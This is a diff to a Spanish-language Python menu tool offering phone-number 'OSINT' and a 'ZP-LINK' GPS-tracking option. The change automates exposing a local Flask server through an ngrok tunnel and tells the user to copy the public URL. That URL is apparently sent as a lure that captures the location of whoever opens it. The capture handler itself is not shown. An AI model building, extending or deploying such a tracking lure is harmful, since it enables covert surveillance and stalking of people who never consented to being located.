@@ -2,7 +2,8 @@
 import os
 import requests
 import threading
-import random
+import subprocess
+import time
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
@@ -67,7 +68,7 @@ def main():
     while True:
         mostrar_banner()
         print(" [1] INFORMACIÓN NÚMERO (OSINT)")
-        print(" [2] ZP-LINK (RASTREO GPS)")
+        print(" [2] ZP-LINK (RASTREO GPS AUTOMATIZADO)")
         print(" [3] CREADOR")
         print(" [4] LICENCIA Y DERECHOS")
         print(" [5] SALIR")
@@ -77,12 +78,15 @@ def main():
             num = input("Introduce MÓVIL: ")
             print(f"\n[+] MOVIL: {num}")
             print("[+] OPERADOR: Identificando...")
-            print("[+] IP: Pendiente de conexión externa")
+            print("[+] IP: Pendiente de consulta externa")
             input("\nENTER para volver...")
         elif opc == "2":
+            # Iniciar servidor Flask
             threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
-            print("\n[!] Servidor activo.")
-            print("[!] En otra terminal: 'ngrok http 5000'")
+            # Iniciar ngrok
+            print("\n[*] Iniciando túnel Ngrok...")
+            subprocess.Popen(['ngrok', 'http', '5000'])
+            print("[!] El sistema está levantando el túnel. Copia tu URL de Ngrok cuando aparezca.")
             input("\nENTER para volver al menú...")
         elif opc == "3":
             print("\n[+] CREADOR: TRX-LILL\n[+] AÑO: 2026")
